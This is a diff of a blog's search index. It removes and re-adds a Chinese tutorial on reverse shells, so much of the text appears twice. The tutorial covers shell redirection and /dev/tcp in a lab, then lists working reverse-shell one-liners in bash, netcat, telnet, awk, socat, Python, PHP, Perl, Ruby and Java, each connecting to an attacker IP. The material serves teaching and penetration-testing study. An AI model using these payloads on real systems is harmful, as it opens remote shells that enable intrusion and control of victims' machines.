-<li><p>-i 这个参数表示的是产生交互式的shell</p>
-</li>
-</ol>
-</li>
-<li><p><strong>/dev/tcp/ip/port</strong></p>
-</li>
-</ul>
-<p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信。</p>
-<p>example：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#靶机输入</span></span><br><span class="line">root@ubuntu18:~<span class="comment"># echo hello world &gt; /dev/tcp/192.168.91.128/2333</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#攻击机接收</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">192.168.91.144: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.144] 32960</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
-<p>example：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#攻击机输入</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">hello world</span><br><span class="line">192.168.91.144: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.144] 32964</span><br><span class="line">I am a good boy</span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机接收</span></span><br><span class="line">root@ubuntu18:~<span class="comment"># cat &lt; /dev/tcp/192.168.91.128/2333</span></span><br><span class="line">hello world</span><br><span class="line">I am a good boy</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>交互重定向</strong></li>
-</ul>
-<p>把上述的两个命令组合起来并使用重定向：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333</span><br></pre></td></tr></table></figure>
-<p>这样就把靶机的shell的标准输出和标准错误给重定向到了攻击机上，这时候我们靶机上已经无法显示东西，但是仍然能够输入命令（只是在靶机上看不见），而命令输出的结果在攻击机上显示。</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325221535454.png" alt="image-20210325221535454"></p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325221526338.png" alt="image-20210325221526338"></p>
-<p>这样还不够，攻击机还需要获得靶机的输入控制权，于是可以在命令的末尾加上把标准输入<code>stdin0</code>重定向到标准输出或者标准错误输出所指向的文件即可：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="常见利用语句"><a href="#常见利用语句" class="headerlink" title="常见利用语句"></a>常见利用语句</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&lt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 &lt;&amp;2</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure>
-<p>文件的读/写打开方式对于文件描述符来讲并没有什么区别</p>
-<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.91.128/2333;cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-<p>解释：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.91.128/2333;</span><br></pre></td></tr></table></figure>
-<p>这一句将文件描述符5重定向到了 <code>/dev/tcp/192.168.91.128/2333</code> 并且方式是<strong>读写方式</strong>，于是我们就能通过文件描述符对这个socket连接进行操作了。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-<p>首先从文件描述符5中读取传过来的命令，通过管道符传到后面的命令，从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。并将操作结果的标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p>
-<p>example:</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325223538469.png" alt="image-20210325223538469"></p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325223556753.png" alt="image-20210325223556753"></p>
-<h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><p>nc如果版本是有 -e 选项的话就能够直接反弹shell，出于安全原因，Ubuntu自带的nc是不带这个选项的。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.91.128 2333</span><br></pre></td></tr></table></figure>
-<p>如果没有 -e 选项的话还可以使用：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.91.128 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
-<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
-<p>example:</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326115210794.png" alt="image-20210326115210794"></p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326115224913.png" alt="image-20210326115224913"></p>
-<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><p>攻击机上打开两个终端分别执行监听：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>
-<p>靶机中执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 192.168.91.128 4444 | /bin/bash | telnet 192.168.91.128 5555</span><br></pre></td></tr></table></figure>
-<p>从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。</p>
-<p>example：</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326121226183.png" alt="image-20210326121226183"></p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326121243836.png" alt="image-20210326121243836"></p>
-<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.91.128/2333&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.91.128:2333</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.91.128&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.91.128&quot;,5555);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.99.242&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;192.168.91.128&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>当我们使用Ubuntu作为服务器，是无法直接通过使用命令执行的函数如<code>system()</code>等去执行<code>bash</code>命令，会显示<code>sh: 1: Syntax error: Bad fd number</code>，这个错误在centos中是不会出现的，这是因为ubuntu从6.10开始，默认使用dash（登录还是用bash），因为dash更快更高效。只要把bash链接到sh即可。</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20190115161623.png" alt="img"></p>
-<h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><p>由于把Window作为服务器比较少见，在加上里面很多东西我也没见过，这里贴个链接，以备不时之需。</p>
-<p><a class="link"   href="https://lipeilipei.top/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" >Windows 反弹 shell<i class="fas fa-external-link-alt"></i></a></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://xz.aliyun.com/t/2548" >Linux反弹shell（一）文件描述符与重定向<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://xz.aliyun.com/t/2549#toc-10" >Linux 反弹shell（二）反弹shell的本质<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>反弹shell</tag>
       </tags>
   </entry>
   <entry>
@@ -1523,6 +1305,314 @@
       </categories>
       <tags>
         <tag>命令注入/执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>反弹shell</title>
+    <url>/2021/03/29/%E5%8F%8D%E5%BC%B9shell/</url>
+    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>​    在介绍反弹链接的时候先说明什么是正向链接：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。而反弹shell是指攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。本质上是网络概念的客户端与服务端的角色反转。<strong>反弹shell简单来说就是通过命令让靶机的shell的控制权交到攻击者的机器中</strong>。</p>
+<p>可能有人会问：我们都能够在靶机上直接执行命令了，为什么还反弹shell呢？这里有几种情况：</p>
+<ol>
+<li><p>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
+</li>
+<li><p>它的ip会动态改变，你不能持续控制。</p>
+</li>
+<li><p>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
+</li>
+<li><p>靶机执行的命令结果没有回显，无法直接获知运行的状态。</p>
+</li>
+</ol>
+<p>这些情况都可以通过反弹shell来解决。</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>想反弹shell只需要一行或者几行命令，但是这里面涉及到的东西日常比较少用，需要大概了解一下才能弄明白这些命令到底做了什么东西。</p>
+<h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><blockquote>
+<p>Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。</p>
+</blockquote>
+<p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
+<table>
+<thead>
+<tr>
+<th>描述符</th>
+<th>用途</th>
+<th>stdio流</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>标准输入</td>
+<td>stdin</td>
+</tr>
+<tr>
+<td>1</td>
+<td>标准输出</td>
+<td>stdout</td>
+</tr>
+<tr>
+<td>2</td>
+<td>标准错误</td>
+<td>stderr</td>
+</tr>
+</tbody></table>
+<p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p>
+<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
+<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p>
+<ol>
+<li>输入重定向 <code>&lt;</code>、<code> &lt;&lt;</code></li>
+<li>输出重定向 <code>&gt;</code> 、<code>&gt;&gt;</code></li>
+</ol>
+<p><strong>重点</strong>：</p>
+<ol>
+<li><p>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p>
+</li>
+<li><p>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
+</li>
+<li><p><code>&lt;</code> 是对标准输入 0 重定向 ，<code>&gt;</code> 是对标准输出 1 重定向</p>
+</li>
+<li><p><strong>再强调一下，重定向就是针对文件描述符的操作</strong></p>
+</li>
+</ol>
+<h4 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h4><p>格式：（注意[n]与&lt;之间没有空格）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;word	</span><br></pre></td></tr></table></figure>
+<p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果 n 省略就是0（标准输入）</p>
+<p>example:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat 0&lt;file</span></span><br><span class="line">hello wordl</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat &lt;file</span></span><br><span class="line">hello wordl</span><br></pre></td></tr></table></figure>
+<p>解释: 解析器解析到 <code>&lt;</code> 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。</p>
+<h4 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h4><p>格式：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&gt;word	</span><br></pre></td></tr></table></figure>
+<p>说明： 将文件描述符 n 重定向到 word 指代的文件（以写的方式打开），如果 n 省略则默认就是 1（标准输出）</p>
+<p>example：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># echo hello&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">hello</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># &gt;file echo world</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">world</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="标准输出与标准错误输出重定向"><a href="#标准输出与标准错误输出重定向" class="headerlink" title="标准输出与标准错误输出重定向"></a>标准输出与标准错误输出重定向</h4><p>格式：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;&gt; word </span><br><span class="line">&gt;&amp; word</span><br></pre></td></tr></table></figure>
+<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 <code>&gt; word 2&gt;&amp;1</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># mkdir &amp;&gt; file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">mkdir: missing operand</span><br><span class="line">Try <span class="string">&#x27;mkdir --help&#x27;</span> <span class="keyword">for</span> more information.</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># ls &amp;&gt; file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h4><p>格式：**(这里所有字符之间不要有空格)**</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;&amp;[m] </span><br><span class="line">[n]&gt;&amp;[m] </span><br></pre></td></tr></table></figure>
+<p>说明：</p>
+<ol>
+<li><p>这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开，<strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p>
+</li>
+<li><p>这里的 &amp; 目的是为了区分数字名字的文件和文件描述符，如果没有 &amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符。</p>
+</li>
+</ol>
+<p><strong>重点：</strong></p>
+<p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p>
+<ul>
+<li>cmd &gt; file 2&gt;&amp;1</li>
+</ul>
+<p>这个是先把标准输出<code>stdout1</code>重定向到file文件中，然后把标准错误<code>stderr2</code>重定向到标准输出所指向的文件中，也就是file。</p>
+<ul>
+<li>cmd 2&gt;&amp;1 &gt;file</li>
+</ul>
+<p>这一个是先把标准错误<code>stderr2</code>重定向到标准输出<code>stdout1</code>所指向的文件，这里默认是屏幕，然后再把标准输出<code>stdout1</code>重定向到file文件中。</p>
+<h4 id="exec-绑定重定向"><a href="#exec-绑定重定向" class="headerlink" title="exec 绑定重定向"></a>exec 绑定重定向</h4><p>格式：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> [n] &lt;/&gt; file/[n]</span><br></pre></td></tr></table></figure>
+<p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p>
+<p><strong>重点：</strong></p>
+<p>格式： </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;&gt;word</span><br></pre></td></tr></table></figure>
+<p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p>
+<p>example：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># exec 3&lt;&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># ls &gt;&amp;3</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># exec 3&lt;&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat &lt;&amp;3</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>学完了前置知识，接下来就看看反弹shell的原理部分。</p>
+<p>实验环境：</p>
+<ul>
+<li><p>靶机（Ubuntu）IP：192.168.91.144</p>
+</li>
+<li><p>攻击机（Kali）IP：192.168.91.128</p>
+</li>
+</ul>
+<p>首先在攻击机上开启监听端口：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
+<p>然后再靶机上执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>然后就可以看到攻击机控制了靶机的shell</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325215552795.png" alt="image-20210325215552795"></p>
+<p>命令解释：</p>
+<ul>
+<li><p><strong>bash -i</strong></p>
+<ol>
+<li><p>bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
+</li>
+<li><p>-i 这个参数表示的是产生交互式的shell</p>
+</li>
+</ol>
+</li>
+<li><p><strong>/dev/tcp/ip/port</strong></p>
+</li>
+</ul>
+<p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信。</p>
+<p>example：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#靶机输入</span></span><br><span class="line">root@ubuntu18:~<span class="comment"># echo hello world &gt; /dev/tcp/192.168.91.128/2333</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#攻击机接收</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">192.168.91.144: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.144] 32960</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<p>example：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#攻击机输入</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">hello world</span><br><span class="line">192.168.91.144: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.144] 32964</span><br><span class="line">I am a good boy</span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机接收</span></span><br><span class="line">root@ubuntu18:~<span class="comment"># cat &lt; /dev/tcp/192.168.91.128/2333</span></span><br><span class="line">hello world</span><br><span class="line">I am a good boy</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>交互重定向</strong></li>
+</ul>
+<p>把上述的两个命令组合起来并使用重定向：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333</span><br></pre></td></tr></table></figure>
+<p>这样就把靶机的shell的标准输出和标准错误给重定向到了攻击机上，这时候我们靶机上已经无法显示东西，但是仍然能够输入命令（只是在靶机上看不见），而命令输出的结果在攻击机上显示。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325221535454.png" alt="image-20210325221535454"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325221526338.png" alt="image-20210325221526338"></p>
+<p>这样还不够，攻击机还需要获得靶机的输入控制权，于是可以在命令的末尾加上把标准输入<code>stdin0</code>重定向到标准输出或者标准错误输出所指向的文件即可：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="常见利用语句"><a href="#常见利用语句" class="headerlink" title="常见利用语句"></a>常见利用语句</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&lt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 &lt;&amp;2</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure>
+<p>文件的读/写打开方式对于文件描述符来讲并没有什么区别</p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.91.128/2333;cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>解释：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.91.128/2333;</span><br></pre></td></tr></table></figure>
+<p>这一句将文件描述符5重定向到了 <code>/dev/tcp/192.168.91.128/2333</code> 并且方式是<strong>读写方式</strong>，于是我们就能通过文件描述符对这个socket连接进行操作了。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>首先从文件描述符5中读取传过来的命令，通过管道符传到后面的命令，从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。并将操作结果的标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p>
+<p>example:</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325223538469.png" alt="image-20210325223538469"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325223556753.png" alt="image-20210325223556753"></p>
